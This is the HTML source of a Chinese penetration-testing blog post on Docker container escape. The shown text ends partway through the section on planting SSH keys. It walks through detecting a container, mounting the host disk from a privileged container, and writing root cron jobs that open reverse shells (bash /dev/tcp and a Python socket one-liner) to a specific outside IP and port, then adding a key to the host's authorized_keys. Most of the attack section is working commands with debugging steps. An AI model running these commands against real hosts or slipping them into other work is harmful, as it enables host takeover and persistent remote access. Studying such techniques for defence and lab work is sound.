@@ -1,0 +1,765 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Docker环境判断查看根目录Docker 容器内部默认会有一个名为 .dockerenv 的隐藏文件，位于根目录下（&#x2F;）。  我们也可以通过查看根目录下的&#x2F;proc&#x2F;1&#x2F;cgroup文件 在 Linux 系统（包括 Docker 容器基于的 Linux 内核环境）中，&#x2F;proc 是一个虚拟文件系统，其中的文件包含了有关进程的各种信息。对于容器内的进程，&#x2F;proc&#x2F;1&#x2F;cgroup 文件内容会体现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Docker Escape Summary">
+<meta property="og:url" content="http://meteorkai.github.io/2025/05/09/Docker-Escape-Summary/index.html">
+<meta property="og:site_name" content="Meteor_Kai">
+<meta property="og:description" content="Docker环境判断查看根目录Docker 容器内部默认会有一个名为 .dockerenv 的隐藏文件，位于根目录下（&#x2F;）。  我们也可以通过查看根目录下的&#x2F;proc&#x2F;1&#x2F;cgroup文件 在 Linux 系统（包括 Docker 容器基于的 Linux 内核环境）中，&#x2F;proc 是一个虚拟文件系统，其中的文件包含了有关进程的各种信息。对于容器内的进程，&#x2F;proc&#x2F;1&#x2F;cgroup 文件内容会体现">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250507122526883.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250507123335135.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250507132232348.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250507132602841.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250507133706061.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250507134107645.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250507143521381.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250507153923773.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250507155118645.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250507155344517.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250507155638580.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250508123913422.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250508125804302.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250508125936639.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250508130956190.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250508131628765.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250508131757989.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250508133227214.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250508133252371.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250508162902326.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250508163019064.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250508163602161.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250508164103522.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250508164147430.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250508164235931.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509114848544.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509115229118.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509115342196.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509120722518.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509120921953.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509122013047.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509121706261.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509122122075.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509122517193.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509130045002.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509130128981.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509130451534.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509131009000.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509132835792.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509140648298.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509140748501.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509141000422.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509143256217.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509143315029.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509144706363.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509144752626.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509144827388.png">
+<meta property="article:published_time" content="2025-05-09T06:49:51.000Z">
+<meta property="article:modified_time" content="2025-05-09T06:50:34.301Z">
+<meta property="article:author" content="Meteor_Kai">
+<meta property="article:tag" content="Docker逃逸">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250507122526883.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Docker Escape Summary</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About me</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/05/03/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E4%B9%8BPE%E7%9B%B8%E5%85%B3%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://meteorkai.github.io/2025/05/09/Docker-Escape-Summary/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://meteorkai.github.io/2025/05/09/Docker-Escape-Summary/&text=Docker Escape Summary"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://meteorkai.github.io/2025/05/09/Docker-Escape-Summary/&title=Docker Escape Summary"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://meteorkai.github.io/2025/05/09/Docker-Escape-Summary/&is_video=false&description=Docker Escape Summary"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Docker Escape Summary&body=Check out this article: http://meteorkai.github.io/2025/05/09/Docker-Escape-Summary/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://meteorkai.github.io/2025/05/09/Docker-Escape-Summary/&title=Docker Escape Summary"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://meteorkai.github.io/2025/05/09/Docker-Escape-Summary/&title=Docker Escape Summary"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://meteorkai.github.io/2025/05/09/Docker-Escape-Summary/&title=Docker Escape Summary"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://meteorkai.github.io/2025/05/09/Docker-Escape-Summary/&title=Docker Escape Summary"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://meteorkai.github.io/2025/05/09/Docker-Escape-Summary/&name=Docker Escape Summary&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://meteorkai.github.io/2025/05/09/Docker-Escape-Summary/&t=Docker Escape Summary"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Docker%E7%8E%AF%E5%A2%83%E5%88%A4%E6%96%AD"><span class="toc-number">1.</span> <span class="toc-text">Docker环境判断</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%A0%B9%E7%9B%AE%E5%BD%95"><span class="toc-number">1.1.</span> <span class="toc-text">查看根目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">1.2.</span> <span class="toc-text">查看系统环境变量</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Docker%E9%80%83%E9%80%B8%E6%96%B9%E5%BC%8F"><span class="toc-number">2.</span> <span class="toc-text">Docker逃逸方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F"><span class="toc-number">2.1.</span> <span class="toc-text">特权模式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.1.1.</span> <span class="toc-text">定时任务反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E5%85%A5ssh%E5%85%AC%E9%92%A5"><span class="toc-number">2.1.2.</span> <span class="toc-text">写入ssh公钥</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker-API%E6%9C%AA%E6%8E%88%E6%9D%83"><span class="toc-number">2.2.</span> <span class="toc-text">Docker API未授权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker-Socket%E9%80%83%E9%80%B8"><span class="toc-number">2.3.</span> <span class="toc-text">Docker Socket逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker-Procfs%E5%8D%B1%E9%99%A9%E6%8C%82%E8%BD%BD"><span class="toc-number">2.4.</span> <span class="toc-text">Docker Procfs危险挂载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cgroup%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-number">2.5.</span> <span class="toc-text">Cgroup配置错误</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SYS-PTRACE-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">2.6.</span> <span class="toc-text">SYS_PTRACE 进程注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%B9%E5%99%A8%E6%BC%8F%E6%B4%9E-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.7.</span> <span class="toc-text">容器漏洞&#x2F;内核漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">3.</span> <span class="toc-text">参考文章</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Docker Escape Summary
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Meteor_Kai</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-05-09T06:49:51.000Z" class="dt-published" itemprop="datePublished">2025-05-09</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Docker%E9%80%83%E9%80%B8/" rel="tag">Docker逃逸</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Docker环境判断"><a href="#Docker环境判断" class="headerlink" title="Docker环境判断"></a>Docker环境判断</h2><h3 id="查看根目录"><a href="#查看根目录" class="headerlink" title="查看根目录"></a>查看根目录</h3><p>Docker 容器内部默认会有一个名为 <code>.dockerenv</code> 的隐藏文件，位于根目录下（<code>/</code>）。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250507122526883.png"></p>
+<p>我们也可以通过查看根目录下的<code>/proc/1/cgroup</code>文件</p>
+<p>在 Linux 系统（包括 Docker 容器基于的 Linux 内核环境）中，<code>/proc</code> 是一个虚拟文件系统，其中的文件包含了有关进程的各种信息。对于容器内的进程，<code>/proc/1/cgroup</code> 文件内容会体现出与容器相关的一些特征。</p>
+<p>如果包含 明显的 docker 标识 则表明处于 Docker 容器中。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250507123335135.png" alt="image-20250507123335135"></p>
+<p>但这些方法也不是一定都可以的。不然一个方法就能通杀了。。</p>
+<h3 id="查看系统环境变量"><a href="#查看系统环境变量" class="headerlink" title="查看系统环境变量"></a>查看系统环境变量</h3><p>查看 hostname 的值，一般 Docker 容器的主机名会带有容器相关的标识，如下，很明显的docker id</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250507132232348.png" alt="image-20250507132232348"></p>
+<h2 id="Docker逃逸方式"><a href="#Docker逃逸方式" class="headerlink" title="Docker逃逸方式"></a>Docker逃逸方式</h2><p>接下来我们正式进入Docker逃逸的环节。一般是拿到shell后进行的。</p>
+<h3 id="特权模式"><a href="#特权模式" class="headerlink" title="特权模式"></a>特权模式</h3><p>特权模式启动命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --privileged -d -p 5000:5000 63293757c330</span><br></pre></td></tr></table></figure>
+
+<p>特权模式逃逸是最简单有效的逃逸方法之一，当使用以特权模式（privileged参数）启动的容器时，就可以在docker容器内部 通过 mount 命令挂载外部主机磁盘设备，获得宿主机文件的读写权限。</p>
+<p>查看当前环境是否为特权模式启动：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/self/status | grep CapEff</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250507132602841.png" alt="image-20250507132602841"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CapEff 对应的掩码值应该为0000003fffffffff 或者是 0000001fffffffff</span><br></pre></td></tr></table></figure>
+
+<p>如上证明为特权模式启动！</p>
+<p>以下命令用于列出系统中所有磁盘设备的分区信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250507133706061.png" alt="image-20250507133706061" style="zoom:80%;" />
+
+<blockquote>
+<p>这里的一堆loop其实也是特权模式的特征！</p>
+</blockquote>
+<p>我们的目标其实就是此处的<code>/dev/vda1</code></p>
+<p>创建一个目录 meteorkai ，并将磁盘设备 <code>/dev/vda1</code> 上的文件系统挂载到  <code>/meteorkai</code> 目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /meteorkai</span><br><span class="line">mount /dev/vda1 /meteorkai</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250507134107645.png" alt="image-20250507134107645"></p>
+<p>挂载成功之后有 两种方式进行逃逸</p>
+<ul>
+<li><p>添加定时任务反弹shell</p>
+</li>
+<li><p>设置ssh公钥</p>
+</li>
+</ul>
+<h4 id="定时任务反弹shell"><a href="#定时任务反弹shell" class="headerlink" title="定时任务反弹shell"></a>定时任务反弹shell</h4><p>（坑太多啦！！！！）</p>
+<p>在 &#x2F;var&#x2F;spool&#x2F;cron 目录下新建一个 root 用户的定时任务<br>（如果&#x2F;var&#x2F;spool&#x2F;cron&#x2F;目录下存在crontabs目录，则在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs目录下进行新建）</p>
+<p>这里我们可以先<code>ls /meteorkai/var/spool/cron/</code>一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;* * * * * /bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/156.238.233.113/4567 0&gt;&amp;1&quot;&#x27; &gt;&gt; /meteorkai/var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;* * * * * /bin/bash -i &gt;&amp; /dev/tcp/156.238.233.113/4567 0&gt;&amp;1&#x27; &gt;&gt; /meteorkai/var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>
+
+<p>注意这条命令我们要在浏览器中输入执行的话要进行url编码！否则不能执行。</p>
+<p>同时这里有个坑！</p>
+<p>定时任务不能写到&#x2F;etc&#x2F;crontab中去！写进去以后<code>crontab -l</code>并不会显示定时任务。</p>
+<p>直接编辑 <code>/etc/crontab</code> 并不一定会被宿主机识别为当前有效的定时任务。<br><code>crontab -l</code> 查看的是当前用户的任务，而在 Docker 容器中修改的<code>/etc/crontab</code> 可能是系统级任务<br>如果需要针对具体用户添加任务，需要在 &#x2F;var&#x2F;spool&#x2F;cron 目录下新建用户名文件去添加某个用户的定时任务</p>
+<p>还要注意不同的 Linux  发行版 定时任务存储路径也是不同的，主要有两个路径：<br> <code>/var/spool/cron</code> <strong>路径</strong></p>
+<ul>
+<li><strong>涉及系统</strong>：Debian、Ubuntu、CentOS、RedHat 等主流 Linux 发行版。</li>
+</ul>
+<p><code>/etc/crontabs</code> <strong>路径</strong></p>
+<ul>
+<li><strong>典型系统</strong>：Alpine Linux 等轻量级发行版。</li>
+</ul>
+<p>如果需要判断具体的宿主机系统版本，可以在 docker 容器中挂载了宿主机 文件后  通过如下命令进行查看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/os-release</span><br></pre></td></tr></table></figure>
+
+
+
+<p>当我们写入计划任务后，我们直接在docker exec中看看crontab</p>
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250507143521381.png" alt="image-20250507143521381"></p>
+<p>发现是成功的！但是我们没有成功弹回shell？？</p>
+<p>我们打印一下错误看看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * bash -i  &#x27;&gt;&amp; /dev/tcp/156.238.233.113/4567 0&gt;&amp;1&#x27;&gt;/tmp/error.txt 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>但是这条也没有被执行？</p>
+<p>Cron 的环境与 Shell 不同，可能导致 <code>date</code> 等命令失效。我们用最简单的这种绝对路径的形式来试试：（注意这里root文件的权限需要为<strong>600</strong>，其他不会执行！！！）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * /bin/date &gt;&gt; /tmp/cron_debug.log 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>发现成功生成了debug文件，说明<strong>计划任务是会正常执行的</strong>。</p>
+<p>接下来我们再试试打印错误日志？改用绝对路径的形式，并赋权600。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * /bin/bash -i &gt;&amp; /dev/tcp/156.238.233.113/4567 0&gt;&amp;1 2&gt;/tmp/cron_error.log</span><br></pre></td></tr></table></figure>
+
+<p>但是还是没有打印日志。</p>
+<p>我们查看一下Ubuntu这边的日志</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -f /var/log/syslog</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250507153923773.png" alt="image-20250507153923773"></p>
+<p>个人认为应该是&#x2F;dev&#x2F;tcp的原因了。</p>
+<p>问了一下AI，Cron 默认使用 <code>/bin/sh</code>（是 <code>dash</code>，而非 <code>bash</code>），导致 <code>/dev/tcp</code> 不可用。我们可以<strong>在 Crontab 开头声明 Shell</strong></p>
+<p>注意赋权600！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SHELL=/bin/bash</span><br><span class="line">* * * * * /bin/bash -i &gt;&amp; /dev/tcp/156.238.233.113/4567 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250507155118645.png" alt="image-20250507155118645"></p>
+<p>成功弹回shell！！</p>
+<p>那就知道了<strong>Cron 默认使用 <code>/bin/sh</code>（是 <code>dash</code>，而非 <code>bash</code>），导致 <code>/dev/tcp</code> 不可用</strong></p>
+<p>既然如此，我们也可以通过避免&#x2F;dev&#x2F;tcp的存在，尝试用python来弹shell！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * /usr/bin/python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;156.238.233.113&quot;,4567));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250507155344517.png" alt="image-20250507155344517"></p>
+<p>在浏览器中输入的形式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;* * * * * /usr/bin/python3 -c &quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;156.238.233.113\&quot;,4567));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\&quot;/bin/bash\&quot;,\&quot;-i\&quot;])&quot;&#x27; &gt;&gt; /meteorkai/var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250507155638580.png" alt="image-20250507155638580"></p>
+<p>也是成功弹了shell！</p>
+<h4 id="写入ssh公钥"><a href="#写入ssh公钥" class="headerlink" title="写入ssh公钥"></a>写入ssh公钥</h4><p>这里其实就是我们把我们生成一对ssh密钥，将ssh公钥写入宿主机，然后我们再用生成的ssh私钥去连接即可。</p>
+<p>这里我就不亲自实践了，因为改个ssh我vps跟终端的简单连接会断掉，懒得重新连了。。</p>
+<p>首先是生成公钥文件与私钥文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096 -f my_key -N &quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>将公钥文件内容写入到宿主机的 <code>/root/.ssh/authorized_keys</code> 文件中，并赋予对应权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;公钥内容&quot; &gt;&gt; /meteorkai/root/.ssh/authorized_keys</span><br><span class="line">chmod 600 /meteorkai/root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
+
